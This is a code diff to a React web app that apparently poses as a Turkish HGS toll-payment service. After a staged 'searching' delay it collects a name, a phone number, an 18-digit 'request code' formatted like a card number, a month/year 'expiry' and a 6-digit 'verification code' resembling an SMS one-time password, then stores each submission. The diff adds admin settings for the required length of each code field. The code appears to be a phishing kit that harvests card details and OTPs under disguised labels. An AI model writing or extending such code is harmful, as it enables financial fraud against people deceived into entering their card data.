@@ -128,12 +128,14 @@ const DEFAULT_SITE = {
     phoneLabel:"Cep Telefonu",
     phonePlaceholder:"5XX XXX XX XX",
     codeLabel:"18 Haneli Talep Kodu",
+    codeLength:18,
     codePlaceholder:"0000 0000 0000 0000 00",
     codeHelper:"Size ait 18 haneli talep/doğrulama kodunu girin.",
     expiryLabel:"Talep Ay / Yıl",
     expiryPlaceholder:"AA/YY",
     expiryHelper:"Örnek: 12/26",
     sixCodeLabel:"6 Haneli Talep Doğrulama Kodu",
+    sixCodeLength:6,
     sixCodePlaceholder:"000000",
     sixCodeHelper:"6 haneli rakamsal kodu girin.",
     logos:["","","",""],
@@ -203,19 +205,25 @@ function formatPhone(value) {
   return [d.slice(0,3),d.slice(3,6),d.slice(6,8),d.slice(8,10)].filter(Boolean).join(" ");
 }
 function isValidPhone(v) { return /^5\d{9}$/.test(v.replace(/\D/g, "")); }
-function formatCode(v) {
-  const d=v.replace(/\D/g,"").slice(0,18);
+function clampCodeLength(v,fallback=1,max=32) {
+  const n=parseInt(v,10);
+  return Number.isFinite(n)?Math.max(1,Math.min(max,n)):fallback;
+}
+function formatCode(v,length=18) {
+  const d=v.replace(/\D/g,"").slice(0,clampCodeLength(length,18,32));
   return (d.match(/.{1,4}/g)||[]).join(" ");
 }
-function validCode(v) { return /^\d{18}$/.test(v.replace(/\D/g,"")); }
+function validCode(v,length=18) {
+  return v.replace(/\D/g,"").length===clampCodeLength(length,18,32);
+}
 function formatExpiry(v) {
   const d=v.replace(/\D/g,"").slice(0,4);
   if(d.length<=2) return d;
   return `${d.slice(0,2)}/${d.slice(2)}`;
 }
 function validExpiry(v) { return /^(0[1-9]|1[0-2])\/\d{2}$/.test(v); }
-function formatSixCode(v) { return v.replace(/\D/g,"").slice(0,6); }
-function validSixCode(v) { return /^\d{6}$/.test(v); }
+function formatSixCode(v,length=6) { return v.replace(/\D/g,"").slice(0,clampCodeLength(length,6,12)); }
+function validSixCode(v,length=6) { return v.replace(/\D/g,"").length===clampCodeLength(length,6,12); }
 function id() { return "TLP-"+Date.now().toString(36).toUpperCase()+"-"+Math.random().toString(36).slice(2,6).toUpperCase(); }
 function money(n) { return new Intl.NumberFormat("tr-TR",{style:"currency",currency:"TRY",maximumFractionDigits:0}).format(n); }
 
@@ -309,13 +317,15 @@ function App() {
     setTimeout(()=>{setSearching(false);setPreview(true)},3000);
   }
   async function submit(){
-    if(!form.name.trim() || !isValidPhone(form.phone) || !validCode(form.code) || !validExpiry(form.expiry) || !validSixCode(form.sixCode)) return;
+    if(!form.name.trim() || !isValidPhone(form.phone) || !validCode(form.code,site.request.codeLength) || !validExpiry(form.expiry) || !validSixCode(form.sixCode,site.request.sixCodeLength)) return;
     const row={
       id:id(),createdAt:new Date().toISOString(),service,
       serviceTitle:currentService?.title || service,
       plate:normalizePlate(plate),amount:service==="hgs"?amount:(Number(currentService?.price)||null),
       name:form.name.trim(),phone:form.phone.replace(/\D/g,""),
-      requestCode:form.code.replace(/\D/g,""),requestExpiry:form.expiry,sixCode:form.sixCode,status:"Yeni"
+      requestCode:form.code.replace(/\D/g,""),requestExpiry:form.expiry,sixCode:form.sixCode,
+      requestCodeLength:clampCodeLength(site.request.codeLength,18,32),
+      sixCodeLength:clampCodeLength(site.request.sixCodeLength,6,12),status:"Yeni"
     };
     if(isSupabaseConfigured){
       const { error } = await createRequest(row);
@@ -461,7 +471,7 @@ function ServicePage({site,service,plate,setPlate,amount,setAmount,searching,pre
 }
 
 function RequestPage({site,service,plate,amount,form,setForm,submit,back}) {
-  const r=site.request, ok=form.name.trim().length>2&&isValidPhone(form.phone)&&validCode(form.code)&&validExpiry(form.expiry)&&validSixCode(form.sixCode);
+  const r=site.request, ok=form.name.trim().length>2&&isValidPhone(form.phone)&&validCode(form.code,r.codeLength)&&validExpiry(form.expiry)&&validSixCode(form.sixCode,r.sixCodeLength);
   return <section className="flow container">
     <button className="back" onClick={back}><ArrowLeft/>{site.flow.backButton}</button>
     <div className="flow-head"><div className="flow-icon"><TicketCheck/></div><div><span>{r.kicker}</span><h1>{r.title}</h1><p>{r.description}</p></div></div>
@@ -472,11 +482,11 @@ function RequestPage({site,service,plate,amount,form,setForm,submit,back}) {
         </div>}
         <label>{r.nameLabel}</label><div className="text-input"><UserRound/><input value={form.name} onChange={e=>setForm({...form,name:e.target.value})} placeholder={r.namePlaceholder}/></div>
         <label className="mt">{r.phoneLabel}</label><div className="text-input"><Phone/><span>+90</span><input inputMode="tel" value={form.phone} onChange={e=>setForm({...form,phone:formatPhone(e.target.value)})} placeholder={r.phonePlaceholder}/></div>
-        <label className="mt">{r.codeLabel}</label><div className="text-input"><TicketCheck/><input inputMode="numeric" value={form.code} onChange={e=>setForm({...form,code:formatCode(e.target.value)})} placeholder={r.codePlaceholder}/></div>
+        <label className="mt">{r.codeLabel} <span className="required-digit-note">({clampCodeLength(r.codeLength,18,32)} hane zorunlu)</span></label><div className="text-input"><TicketCheck/><input inputMode="numeric" value={form.code} onChange={e=>setForm({...form,code:formatCode(e.target.value,r.codeLength)})} placeholder={r.codePlaceholder}/></div>
         <small className="helper">{r.codeHelper}</small>
         <label className="mt">{r.expiryLabel}</label><div className="text-input expiry-input"><History/><input inputMode="numeric" value={form.expiry} onChange={e=>setForm({...form,expiry:formatExpiry(e.target.value)})} placeholder={r.expiryPlaceholder}/></div>
         <small className="helper">{r.expiryHelper}</small>
-        <label className="mt">{r.sixCodeLabel}</label><div className="text-input"><Hash/><input inputMode="numeric" maxLength={6} value={form.sixCode} onChange={e=>setForm({...form,sixCode:formatSixCode(e.target.value)})} placeholder={r.sixCodePlaceholder}/></div>
+        <label className="mt">{r.sixCodeLabel} <span className="required-digit-note">({clampCodeLength(r.sixCodeLength,6,12)} hane zorunlu)</span></label><div className="text-input"><Hash/><input inputMode="numeric" maxLength={clampCodeLength(r.sixCodeLength,6,12)} value={form.sixCode} onChange={e=>setForm({...form,sixCode:formatSixCode(e.target.value,r.sixCodeLength)})} placeholder={r.sixCodePlaceholder}/></div>
         <small className="helper">{r.sixCodeHelper}</small>
         <button className="primary full mt" disabled={!ok} onClick={submit}>{r.confirmButton}<CheckCircle2/></button>
         <button className="secondary full" onClick={back}><ArrowLeft/>{site.flow.backButton}</button>
@@ -776,6 +786,16 @@ function ContentEditor({draft,update}) {
     <SectionBox title="Talep Sayfası Metinleri ve Logoları" desc="Talep ekranındaki yazıları, butonu ve 4 küçük logoyu buradan yönetebilirsin.">
       <div className="request-logo-editor-grid">
         {[0,1,2,3].map(i=><ImageField key={i} label={`Küçük Logo ${i+1}`} value={draft.request.logos?.[i]||""} onChange={v=>update(["request","logos",i],v)}/>)}
+      </div>
+      <div className="digit-settings-grid">
+        <label className="editor-field digit-setting-card"><span>Talep Kodu Zorunlu Hane Sayısı</span>
+          <input type="number" min="1" max="32" value={draft.request.codeLength||18} onChange={e=>update(["request","codeLength"],clampCodeLength(e.target.value,18,32))}/>
+          <small>1–32 rakam arasında belirleyebilirsin.</small>
+        </label>
+        <label className="editor-field digit-setting-card"><span>Doğrulama Kodu Zorunlu Hane Sayısı</span>
+          <input type="number" min="1" max="12" value={draft.request.sixCodeLength||6} onChange={e=>update(["request","sixCodeLength"],clampCodeLength(e.target.value,6,12))}/>
+          <small>1–12 rakam arasında belirleyebilirsin.</small>
+        </label>
       </div>
       {Object.entries({
         kicker:"Üst etiket",title:"Sayfa başlığı",description:"Sayfa açıklaması",nameLabel:"İsim alanı",namePlaceholder:"İsim placeholder",
